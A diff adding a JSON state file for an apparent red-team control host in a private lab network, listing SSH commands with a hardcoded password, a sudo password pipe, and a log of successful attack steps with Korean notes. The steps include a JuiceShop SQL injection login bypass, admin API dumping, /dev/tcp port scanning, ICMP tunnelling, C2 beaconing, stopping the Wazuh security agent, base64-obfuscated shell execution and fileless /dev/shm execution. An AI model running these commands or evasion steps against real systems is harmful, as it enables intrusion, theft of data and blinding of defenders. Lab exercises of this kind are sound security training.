@@ -1,0 +1,30 @@
+{
+  "server": "opsclaw",
+  "role": "control-plane / red-team-origin",
+  "ip": "10.20.30.201",
+  "updated_at": "2026-03-25T22:00:00Z",
+  "tools": {
+    "ssh_to_secu": "sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1",
+    "ssh_to_web": "sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80",
+    "ssh_to_siem": "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100",
+    "sudo_pattern": "echo 1 | sudo -S",
+    "curl_json_post": "curl -s -X POST <url> -H 'Content-Type: application/json' -d '<json>'"
+  },
+  "experiences": [
+    "Red T1: JuiceShop SQLi 성공 — curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' OR 1=1--\",\"password\":\"x\"}' → JWT 토큰 획득",
+    "Red T1: FTP 디렉토리 노출 — curl -s http://10.20.30.80:3000/ftp/ → acquisitions.md, coupons 등",
+    "Red T1: 관리자 API — curl -s http://10.20.30.80:3000/api/Users -H 'Authorization: Bearer <jwt>' → 전체 사용자 목록",
+    "Red T2: 내부 포트 스캔 — bash /dev/tcp 방식으로 10개 오픈 포트 발견 (secu:22, web:22,80,3000,8082, siem:22,443,1514,55000,9400)",
+    "Red T2: ICMP 터널링 — ping -c 20 -s 1400 10.20.30.80 → 28KB 전송 성공, IPS 미탐지",
+    "Red T2: HTTP C2 비콘 — curl로 Base64 쿠키 15회 전송 성공",
+    "Red T3: web 서버 sudo NOPASSWD ALL 발견 — sshpass -p1 ssh web@10.20.30.80 'sudo -l'",
+    "Red T4: Wazuh agent 정지 — sshpass -p1 ssh web@10.20.30.80 'echo 1 | sudo -S systemctl stop wazuh-agent'",
+    "Red T4: Base64 난독화 — echo aWQ= | base64 -d | sh → uid=1000 출력",
+    "Red T4: /dev/shm 메모리 실행 — 디스크 흔적 없이 스크립트 실행 성공"
+  ],
+  "network_map": {
+    "secu": {"ip": "10.20.30.1", "services": ["ssh:22"], "role": "nftables+Suricata IPS"},
+    "web": {"ip": "10.20.30.80", "services": ["ssh:22", "apache:80", "juiceshop:3000", "proxy:8082"], "role": "WAF+WebApp"},
+    "siem": {"ip": "10.20.30.100", "services": ["ssh:22", "dashboard:443", "wazuh-api:55000", "agent:1514", "opencti:9400"], "role": "Wazuh SIEM"}
+  }
+}
